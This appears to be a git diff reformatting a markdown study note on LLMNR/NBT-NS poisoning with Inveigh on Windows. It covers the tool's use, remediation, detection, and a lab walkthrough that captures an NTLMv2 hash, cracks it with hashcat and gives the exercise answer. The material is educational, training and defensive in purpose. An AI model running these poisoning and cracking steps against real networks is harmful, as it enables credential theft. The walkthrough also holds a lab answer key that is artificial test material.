@@ -1,4 +1,4 @@
-# LLMNR/NBT-NS Poisoning from Windows
+# 🪟 LLMNR/NBT-NS Poisoning from Windows
 
 ## 📋 Overview
 
@@ -9,17 +9,19 @@ LLMNR and NBT-NS poisoning attacks can also be performed from Windows hosts usin
 **Inveigh** is a Windows-based LLMNR/NBT-NS poisoning tool available in both PowerShell and C# versions:
 
 ### 📍 Key Features
-- **Multi-Protocol Support**: IPv4, IPv6, LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6
-- **Service Poisoning**: HTTP, HTTPS, SMB, LDAP, WebDAV, Proxy Auth
-- **Interactive Console**: Real-time hash viewing and management
-- **File Output**: Automatic logging of captured credentials
-- **Stealth Options**: Various configuration options for evasion
+
+* **Multi-Protocol Support**: IPv4, IPv6, LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6
+* **Service Poisoning**: HTTP, HTTPS, SMB, LDAP, WebDAV, Proxy Auth
+* **Interactive Console**: Real-time hash viewing and management
+* **File Output**: Automatic logging of captured credentials
+* **Stealth Options**: Various configuration options for evasion
 
 ### 📂 Tool Locations
-- **PowerShell Version**: `C:\Tools\Inveigh.ps1` (original, no longer updated)
-- **C# Version**: `C:\Tools\Inveigh.exe` (actively maintained)
 
----
+* **PowerShell Version**: `C:\Tools\Inveigh.ps1` (original, no longer updated)
+* **C# Version**: `C:\Tools\Inveigh.exe` (actively maintained)
+
+***
 
 ## 🔧 PowerShell Inveigh
 
@@ -71,7 +73,7 @@ WARNING: [!] Run Stop-Inveigh to stop
 [*] Press any key to stop console output
 ```
 
----
+***
 
 ## 🚀 C# Inveigh (InveighZero)
 
@@ -108,14 +110,16 @@ WARNING: [!] Run Stop-Inveigh to stop
 ```
 
 ### 🎯 Service Status Legend
-- **[+]** = Enabled by default
-- **[ ]** = Disabled by default
 
----
+* **\[+]** = Enabled by default
+* **\[ ]** = Disabled by default
+
+***
 
 ## 🖥️ Interactive Console
 
 ### 🔑 Accessing Console
+
 Press **ESC** while Inveigh is running to enter interactive mode.
 
 ### 📋 Available Commands
@@ -175,19 +179,21 @@ IP Address                        Host                              Username    
 172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\svc_qualys        | 5F9BB670D23F23ED
 ```
 
----
+***
 
 ## 🔒 Remediation
 
 ### 🚫 Disabling LLMNR
 
 **Method 1: Group Policy**
+
 1. Navigate to: `Computer Configuration → Administrative Templates → Network → DNS Client`
 2. Enable: **"Turn OFF Multicast Name Resolution"**
 
 ### 🚫 Disabling NBT-NS
 
 **Method 1: Local Configuration**
+
 1. Open **Network and Sharing Center**
 2. Click **Change adapter settings**
 3. Right-click adapter → **Properties**
@@ -196,6 +202,7 @@ IP Address                        Host                              Username    
 6. Select **Disable NetBIOS over TCP/IP**
 
 **Method 2: PowerShell Script (GPO)**
+
 ```powershell
 # Script to disable NBT-NS via registry
 $regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
@@ -205,6 +212,7 @@ Get-ChildItem $regkey | foreach {
 ```
 
 **GPO Deployment Steps:**
+
 1. Create script in `Computer Configuration → Windows Settings → Script (Startup/Shutdown) → Startup`
 2. Choose **PowerShell Scripts** tab
 3. Set to **Run Windows PowerShell scripts first**
@@ -212,57 +220,64 @@ Get-ChildItem $regkey | foreach {
 
 ### 🛡️ Additional Mitigations
 
-- **Network Filtering**: Block LLMNR/NetBIOS traffic
-- **SMB Signing**: Enable to prevent NTLM relay attacks
-- **NIDS/NIPS**: Deploy network intrusion detection systems
-- **Network Segmentation**: Isolate critical hosts
+* **Network Filtering**: Block LLMNR/NetBIOS traffic
+* **SMB Signing**: Enable to prevent NTLM relay attacks
+* **NIDS/NIPS**: Deploy network intrusion detection systems
+* **Network Segmentation**: Isolate critical hosts
 
----
+***
 
 ## 🔍 Detection
 
 ### 📊 Detection Methods
 
 **1. Honeypot Technique**
-- Inject LLMNR/NBT-NS requests for non-existent hosts
-- Alert on any responses (indicates spoofing activity)
+
+* Inject LLMNR/NBT-NS requests for non-existent hosts
+* Alert on any responses (indicates spoofing activity)
 
 **2. Network Monitoring**
-- Monitor traffic on ports **UDP 5355** and **137**
-- Track unusual name resolution patterns
+
+* Monitor traffic on ports **UDP 5355** and **137**
+* Track unusual name resolution patterns
 
 **3. Event Log Monitoring**
-- Monitor Event IDs: **4697** and **7045**
-- Track new service installations
+
+* Monitor Event IDs: **4697** and **7045**
+* Track new service installations
 
 **4. Registry Monitoring**
-- Key: `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient`
-- Monitor `EnableMulticast` DWORD value
-- Value of **0** = LLMNR disabled
+
+* Key: `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient`
+* Monitor `EnableMulticast` DWORD value
+* Value of **0** = LLMNR disabled
 
 ### 🚨 IOCs (Indicators of Compromise)
 
-- Unusual LLMNR/NBT-NS response patterns
-- Multiple authentication failures from single IP
-- Unexpected SMB connections
-- Non-existent hostname resolution attempts
+* Unusual LLMNR/NBT-NS response patterns
+* Multiple authentication failures from single IP
+* Unexpected SMB connections
+* Non-existent hostname resolution attempts
 
----
+***
 
 ## 🎯 HTB Academy Lab Walkthrough
 
 ### 📝 Question
-*"Run Inveigh and capture the NTLMv2 hash for the svc_qualys account. Crack and submit the cleartext password as the answer."*
+
+_"Run Inveigh and capture the NTLMv2 hash for the svc\_qualys account. Crack and submit the cleartext password as the answer."_
 
 ### 🚀 Step-by-Step Solution
 
 #### 1️⃣ **Connect to Target**
+
 ```bash
 # RDP to Windows attack box
 xfreerdp /v:TARGET_IP /u:htb-student /p:Academy_student_AD!
 ```
 
 #### 2️⃣ **Import and Start Inveigh**
+
 ```powershell
 # Navigate to tools directory
 cd C:\Tools
@@ -275,6 +290,7 @@ Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
 ```
 
 #### 3️⃣ **Wait for Hash Capture** (5+ minutes)
+
 ```powershell
 # Example captured hash output:
 [+] [2022-06-17T23:13:10] SMB(445) NTLMv2 captured for INLANEFREIGHT\svc_qualys from 172.16.5.130(ACADEMY-EA-FILE):50370:
@@ -282,6 +298,7 @@ svc_qualys::INLANEFREIGHT:F9CAC827FD6ABFBF:4CF1F3B24BF1BF34D3ECC049D9FC7052:0101
 ```
 
 #### 4️⃣ **Extract Hash from File**
+
 ```powershell
 # Search for svc_qualys hash in output file
 type .\Inveigh-NTLMv2.txt | Select-String -Pattern "svc_qualys"
@@ -291,6 +308,7 @@ type .\Inveigh-NTLMv2.txt | Select-String -Pattern "svc_qualys" | Clip
 ```
 
 #### 5️⃣ **Transfer to Linux for Cracking**
+
 ```bash
 # Save hash to file
 echo "svc_qualys::INLANEFREIGHT:F9CAC827FD6ABFBF:4CF1F3B24BF1BF34D3ECC049D9FC7052:010100000000000086E60D7CDA82D801DFB87B40C430171C0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080086E60D7CDA82D801060004000200000008003000300000000000000000000000003000006C04F59E654683B7ABEECE956F72B3A9164B0BD891DE9D612B30FF3E26D79F510A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000" > svc_qualys_hash.txt
@@ -300,6 +318,7 @@ perl -p -i -e 's/\R//g;' svc_qualys_hash.txt
 ```
 
 #### 6️⃣ **Crack with Hashcat**
+
 ```bash
 # Crack NTLMv2 hash (mode 5600)
 hashcat -m 5600 -w 3 -O svc_qualys_hash.txt /usr/share/wordlists/rockyou.txt
@@ -309,37 +328,40 @@ hashcat -m 5600 -w 3 -O svc_qualys_hash.txt /usr/share/wordlists/rockyou.txt
 
 ### ✅ **Answer**: `security#1`
 
----
+***
 
 ## 🔑 Key Takeaways
 
 ### ✅ **Advantages of Inveigh**
-- **Native Windows tool** - blends with environment
-- **Interactive console** - real-time hash management
-- **Multiple protocols** - comprehensive attack coverage
-- **File logging** - persistent hash storage
+
+* **Native Windows tool** - blends with environment
+* **Interactive console** - real-time hash management
+* **Multiple protocols** - comprehensive attack coverage
+* **File logging** - persistent hash storage
 
 ### ⚠️ **Considerations**
-- Requires **elevated privileges** on Windows
-- May trigger **AV detection** (especially C# version)
-- **Network noise** - generates visible traffic
-- **HTTP listener conflicts** - check port availability
+
+* Requires **elevated privileges** on Windows
+* May trigger **AV detection** (especially C# version)
+* **Network noise** - generates visible traffic
+* **HTTP listener conflicts** - check port availability
 
 ### 🎯 **Best Practices**
-- Use **file output** for hash persistence
-- Monitor **console output** for real-time feedback
-- Combine with **BloodHound** for target prioritization
-- Understand **network topology** before attacking
 
----
+* Use **file output** for hash persistence
+* Monitor **console output** for real-time feedback
+* Combine with **BloodHound** for target prioritization
+* Understand **network topology** before attacking
+
+***
 
 ## 🔗 Additional Resources
 
-- **Inveigh GitHub**: https://github.com/Kevin-Robertson/Inveigh
-- **Inveigh Wiki**: https://github.com/Kevin-Robertson/Inveigh/wiki
-- **MITRE ATT&CK**: T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay
-- **Detection Blog**: Using honeypots for LLMNR/NBT-NS detection
+* **Inveigh GitHub**: https://github.com/Kevin-Robertson/Inveigh
+* **Inveigh Wiki**: https://github.com/Kevin-Robertson/Inveigh/wiki
+* **MITRE ATT\&CK**: T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay
+* **Detection Blog**: Using honeypots for LLMNR/NBT-NS detection
 
----
+***
 
-*This attack is effective when LLMNR/NBT-NS protocols are enabled and demonstrates the importance of proper network configuration and monitoring.* 
+_This attack is effective when LLMNR/NBT-NS protocols are enabled and demonstrates the importance of proper network configuration and monitoring._
